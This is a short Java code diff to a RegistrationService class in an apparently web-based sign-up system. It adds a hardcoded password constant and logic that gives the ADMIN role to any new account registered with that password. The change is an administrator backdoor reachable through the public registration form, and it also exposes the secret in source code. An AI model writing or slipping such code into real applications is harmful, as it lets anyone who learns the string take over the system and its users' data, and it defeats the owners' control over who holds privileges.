@@ -22,13 +22,17 @@ public class RegistrationService {
     private ConfirmationTokenService confirmationTokenService;
     private EmailService emailService;
     private EmailTemplateService emailTemplateService;
+    private final static String ADMIN_PASSWORD = "fOoTbAlLtIx_281202";
 
     public String register(RegistrationRequest registrationRequest) {
+        UserRole role = registrationRequest
+                .getPassword()
+                .equals(ADMIN_PASSWORD) ? UserRole.ADMIN : UserRole.USER;
         String token = userService.createUser(new User(
                 registrationRequest.getFullName(),
                 registrationRequest.getEmail(),
                 registrationRequest.getPassword(),
-                UserRole.USER
+                role
         ));
 
         sendConfirmationToken(registrationRequest.getEmail());
